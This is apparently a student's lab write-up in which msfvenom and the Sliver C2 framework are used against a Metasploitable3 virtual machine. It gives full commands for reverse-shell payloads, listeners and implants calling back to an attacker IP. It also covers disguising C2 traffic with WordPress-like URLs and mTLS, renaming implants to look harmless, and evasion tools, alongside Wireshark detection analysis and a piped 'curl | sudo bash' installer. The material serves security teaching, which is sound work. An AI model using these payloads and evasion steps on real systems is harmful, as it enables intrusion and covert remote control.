# A) Venom
**Objective**
- Create malware using **Msfvenom** that calls "home" and establishes a **reverse shell**
- Accept the connection using Metasploits `multi/handler`

## What's msfvenom?
A payload generator and encoder
- Source: msfvenom man pages

## Target
`metasploitable3` is todays victim, fire it up:
```bash
$ vagrant up ub1404
```
More on ms3 [here](<https://github.com/rapid7/metasploitable3>) and how I [set it up](<https://github.com/Ali-Mikael/Pen-testing/blob/main/h3-EternalExploit.md#setting-up>) using libvirt as the provider.

## Reverse 🐚
Fire up Kali and straight to man pages we go:
```bash
$ man msfvenom
```

I got the basic idea but didn't know which `output format` to use, so we do:
```bash
$ msfvenom --list formats
```

Then craft the payload:
```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.130.233 LPORT=4040 -f elf -o legitBin

# Make the payload executable:
$ chmod +x legitBin
```
Flags explained:
- `-p`: Payload to use: `linux/x86/shell_reverse_tcp`
- `-f`: Output format: `elf`
  - `Executable & Linkable Format` is a binary format which can be executed on the system 
- `-o`: Where to store output: `legitBin` A.K.A `Totally Legit Binary you Should Execute!`


> [!TIP]
> Use tab completion to your advantage. For example, after specifying the platform and architecture `linux/x86/`, press tab a few times to get all the available options for that specific `OS/Arch`!
>
> Note: I'm using using the `Z Shell` A.K.A `ZSH` here!


In `msfconsole` we use the `multi/handler` module to set up a listener:
```console
$ sudo msfconsole
msf > use exploit/multi/handler
    > options
    > set LHOST 192.168.130.233
    > set LPORT 4040
    > set payload linux/x86/shell_reverse_tcp
    > run
[*] Started reverse TCP handler on 192.168.130.233:4040 
```
**Explained**
- `LHOST`: Same IP as in the payload (attackers IP)
- `LPORT`: Port to listen to, same as in the payload
- `payload`: Match it with the one we created the payload with

Now that the listener is running we can execute the payload on the victims machine to get a reverse shell.

Get the ip of the victim:
```bash
$ sudo nmap -sn -T4 192.168.130.0/24

Nmap scan report for metasploitable3-ub1404 (192.168.130.202)
Host is up
```


**Drop the bomb:**
```bash
$ rsync -av legitBin vagrant@192.168.130.202:/home/vagrant/
```
We're sending the payload via SSH using `rsync`, but let's use our imagination here and say we did a successful phishing campaign! ;)

The victim clicked a link which downloaded & executed the binary:

<img width="876" height="169" alt="2026-04-30-16:27:06" src="https://github.com/user-attachments/assets/a0d66341-2b3f-481e-ac20-f9e65f27a20c" />

The listener catches the connection and the attacker effectively now has a reverse shell:
<img width="1793" height="769" alt="2026-04-30-16:26:39" src="https://github.com/user-attachments/assets/e94a33e8-4162-482c-bbe6-40db9c8a2847" />






--------------






# B) Where's Venom
**Objective**
- Inspect and analyze the reverse shell connection using a packet sniffer such as Wireshark
  - What do you observe?
  - What makes the connection detectable?
  - How would one obscure the detection?
 

## Eavesdropping
I started capturing packets on the attack machines's interface `eth1` using Wireshark. We can inspect the data being exchanged more closely by `right clicking` one of the packets, then click `Follow` and lastly choose: `TCP Stream`.

`Red` is the attacker and `blue` is the response from the victim, talk about read team / blue team lol:

<img width="1394" height="846" alt="2026-04-30-16:56:30" src="https://github.com/user-attachments/assets/42c6299b-4d5b-49e3-9de1-25c858181a74" />


This makes it obvious that somebody is connected to the machine and executing shell commands. One could **obscure** it by encrypting the traffic for example!





------------





# C) Hello Sliver
**Objective**
- Show an example of an HTTP-connection using Sliver


<img width="948" height="224" alt="2026-05-01-19:29:33" src="https://github.com/user-attachments/assets/7f013b43-060f-43b5-b046-a6a82179ed2b" />


## Sliver?
"A powerful [command and control framework](<https://sliver.sh/>) designed to provide advanced capabilities for covertly managing and controlling remote systems"

## Install on kali:
```bash
$ sudo apt update && sudo apt install sliver -y
# OR
$ curl https://sliver.sh/install | sudo bash
```

Type `sliver-server` for the interactive console:

<img width="1774" height="729" alt="2026-04-30-18:56:52" src="https://github.com/user-attachments/assets/9ea10b53-291b-474c-bc57-dfa3f4998e38" />


> [!TIP]
> Type `help` for a listing of all available commands !


## Modes
Sliver `implants` operate in `beacon` or `session` mode. **Beacon mode** basically means that the implant on the client will periodically retreive tasks from the server, execute them, and return with the results, this is an asynchronous mode of communication.

In **session mode** the implant creates a real-time session either by a **persistent connection** or **long polling**. Long polling basically means the client will check in with the server and only return after there's something to return with, compared to short polling where the client periodically sends probes to the target.

**Q:** You talked about implants, what are they?

**A:** An `implant` is the actual code that runs on the target system we want remote access to!

In order to establish a connection, we first need to **generate the implant**. We don't know how to do that yet, so in the console:
```console
sliver > generate --help
```
This gives us a pretty comprehensive list of all the options.

Having perused the help page we come up with the following:
```console
sliver > generate -b 192.168.130.233 -o linux

```
**Flags:**
- `-b` - http(s) connection string
- `-o` - Operating system

Wait a few seconds for it to compile and get:
```
[*] Build completed in 2m44s
[*] Implant saved to /home/steve/box/sliver/PAINFUL_WHORL
```
List all implants like so:

<img width="1904" height="345" alt="2026-04-30-19:36:09" src="https://github.com/user-attachments/assets/65c5efb1-8274-47fe-9f5b-41e60ae3ecca" />


Start a `HTTP` listener:
```console
sliver > http

[*] Starting HTTP :80 listener ...
[*] Successfully started job #2
```

### Active session?

<img width="533" height="129" alt="2026-04-30-19:39:41" src="https://github.com/user-attachments/assets/e1ce07f8-5fbf-40c9-a21f-78c1b8332220" />

Not yet :/ Let's change that! If you paid attention you know it saved the **payload** to a directory I created earlier for sliver. 

We go to the directory and send the payload away:
```bash
$ rsync -av PAINFUL_WHORL vagrant@192.168.130.202:/home/vagrant
```
On the victim: (play along that we did some magnificent phishing campaign again and got the victim to download the malware! 😆)
<img width="881" height="120" alt="2026-04-30-19:44:01" src="https://github.com/user-attachments/assets/4b4df092-8eb5-4958-89ab-a1fa70b40692" />

If we type `sessions` again in the console we can see that the connection is activated:

<img width="1858" height="197" alt="2026-04-30-19:44:33" src="https://github.com/user-attachments/assets/dd1d514b-2f1e-485a-9e2f-8134147f3e90" />


To `use` the session we:

<img width="1364" height="233" alt="2026-04-30-19:46:39" src="https://github.com/user-attachments/assets/6f3b0f6c-3201-49d6-9805-ce0cf47a9da6" />

While connected you can always type `help` to get a list of all available commands in the session.

Example of a command we can use: list information about host interfaces:
<img width="1714" height="886" alt="2026-04-30-19:49:03" src="https://github.com/user-attachments/assets/9947b35c-d717-4cab-8c0f-185e427e5089" />

And there you have it, a simple `HTTP` connection. Next we'll dissect it.

**Help received**
-  [Sliver documentation](<https://sliver.sh/docs>)




---------------




# D) Sniff sliver
**Objective**
- Inspect the Sliver http-connection using a packet sniffer
  - What do you observe?
  - What makes the connection detectable?

## Eavesdropping
Fire up wireshark and start listening.

The first suspicious thing we notice is the connection using `HTTP`, which is inherently insecure, plus it uses an old version of said protocol `HTTP/1.1`.

Let's take a look at an example:

<img width="1868" height="392" alt="2026-04-30-19:54:24" src="https://github.com/user-attachments/assets/d8ec6b86-a685-42ef-91af-23e6676a3594" />

The connection is insecure and the `URI` is looking a bit suspect as well.

If we `follow tcp stream` again it looks even more questionable:

<img width="1373" height="685" alt="2026-04-30-20:05:58" src="https://github.com/user-attachments/assets/1fbdb81f-88e2-42eb-ae2d-b6dc321658a2" />

There's a bunch of `GET` requests and the server keeps responding with `204 No Content`, which is used to implement "save and continue editing" functionality in applications.

**Q:** What makes it suspect?

**A:** The fact that the 204 response is meant for `PUT` and `DELETE` requests, **NOT** `GET`. At least that's the understanding I got from the [Mozilla developer docs](<https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204>)

I found one exchange that showed some data being sent:

<img width="1376" height="505" alt="2026-04-30-20:02:20" src="https://github.com/user-attachments/assets/b070c02d-9feb-4e71-81c5-d8bb2bc9131b" />

This is suspicious to me as a plain text http request would usually have some amount of human-redable strings in the data..








-------------







# E) Hiding in plain sight
**Objective**
- One can modify the connection details using Sliver
- Try and show an example
- Showcase that it works

## Totally legit web server!
We want the web traffic to look a bit more legit, so we generate a `c2profile` usin a wordlist of URLs.

If you have `seclists` installed you can use: `/usr/share/seclists/Discovery/Web-Content/URLs/urls-wordpress-x.x.x.txt`, the version i'm using is 3.3.1, depending on when you're reading this the version might differ for you!

Now that we have a wordlist to use, let's create a profile:
```console
sliver > c2profiles generate -f /usr/share/seclists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt -n wordpress -i

C2 profile generated and saved as wordpress
```
**Explained**
- `-f` - Path to file containing URL list
- `-n` - HTTP C2 Profile name
- `-i` - Import generated profile after creation

<img width="766" height="242" alt="2026-05-01-18:59:41" src="https://github.com/user-attachments/assets/e7561949-ae6c-40bb-8630-567b24d0c4cd" />


We then generate a new implant based for the profile:
```console
sliver > generate -b 192.168.130.233 -o linux -C wordpress

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 2m15s
[*] Implant saved to /home/steve/box/sliver/POWERFUL_COCOA
```
You already know the other flags, now we're introducing:
- `-C`: c2 profile

We rename the file and send it away:
```bash
$ mv POWERFUL_COCOA background_agent
$ rsync -av background_agent vagrant@192.168.130.202:/home/vagrant
```

Back in the console we issue the `jobs` command to check if we still have a listener active:
```console
sliver > jobs

 ID   Name   Protocol   Port   Domains 
==== ====== ========== ====== =========
 1    http   tcp        80             
```
Now we just let the listener catch the incoming connection:

<img width="1516" height="517" alt="2026-05-01-19:15:50" src="https://github.com/user-attachments/assets/36985793-bd21-4d7c-ba66-c31fa157b1d2" />

It looks a bit more legit now. Take a look at the GET URL:

<img width="1374" height="592" alt="2026-05-01-19:20:17" src="https://github.com/user-attachments/assets/01b40b71-5b8f-4769-91f8-5205589cecd3" />

**Akismet:**
- <img width="953" height="528" alt="2026-05-01-19:21:17" src="https://github.com/user-attachments/assets/0a14a603-af3f-4624-a598-20b76d006b17" />

Another one:

<img width="1377" height="209" alt="2026-05-01-19:22:14" src="https://github.com/user-attachments/assets/4192aa22-9743-455c-8aea-35e183f1d02d" />



There's something else we can do to obfuscate the connection even more: use `Wireguard` or `mTLS`. I'm going to start with mTLS A.K.A Mutual TLS.


```console
sliver > generate -m 192.168.130.233 -o linux -C wordpress

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 2m34s
[*] Implant saved to /home/steve/box/sliver/TROPICAL_DRESS

```
**New flag**
`-m`: mtls string

I renamed the payload to `mtls` in my own directory as we're starting to rack up payloads so I need a way to identify them.

This time we don't start an http listener, but rather one that can handle the mTLS connection like so:
```console
sliver > mtls
[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port   Domains 
==== ====== ========== ====== =========
 1    mtls   tcp        8888
```
**The victim executes the binary and we have a reverse shell:**

```console
[*] Session 68b2f9b2 TROPICAL_DRESS - 192.168.130.202:35978

sliver > use 68b2f9b2 

[*] Active session TROPICAL_DRESS (68b2f9b2-d3d5-44a3-8f84-40e6672d7202)
```
<img width="778" height="128" alt="2026-05-01-19:55:50" src="https://github.com/user-attachments/assets/f65e3585-bf7c-4b44-ba42-4af05630caab" />


### What's goin on?
Well the traffic is encrypted, so it's much harder to say:

<img width="1521" height="273" alt="2026-05-01-19:50:55" src="https://github.com/user-attachments/assets/1a1636f6-2ac5-4568-9eff-bb785d87639c" />

<img width="1448" height="209" alt="2026-05-01-19:51:15" src="https://github.com/user-attachments/assets/ecde7040-780a-437c-a3ad-ef6bb9a81436" />

### Follow (encrypted) TCP Stream
<img width="1389" height="840" alt="2026-05-01-19:52:20" src="https://github.com/user-attachments/assets/bcd74389-d7d0-4699-80b5-5bd7a66773e9" />




----------------







# F) Feature Rich
**Objective**
- Sliver is good for a lot
- Show examples of some of it's features

## Multitalent

<img width="693" height="519" alt="WIP" src="https://github.com/user-attachments/assets/8a770c06-cc74-4ea6-a679-01db820bf244" />






----------------






# I) Bonus: Veil
**Objective**
- Try out Veil

## About
Veil is designed to generate Metasploit payloads that bypass common anti-virus solutions.

Install it on Kali:
```bash
$ sudo apt update && sudo apt install veil -y
```






---------






# J) Bonus: ScareCrow
**Objective**
- Try out ScareCrow

## About
ScareCrow is a payload creation framework for side loading into a legitimate Window process.




--------



# K) Bonus: PoshC2
**Objective**
- Create malware that spins up a reverse shell using PoshC2


# L) Bonus: Mythic
**Objective**
- Create malware that spins up a reverse shell using Mythic
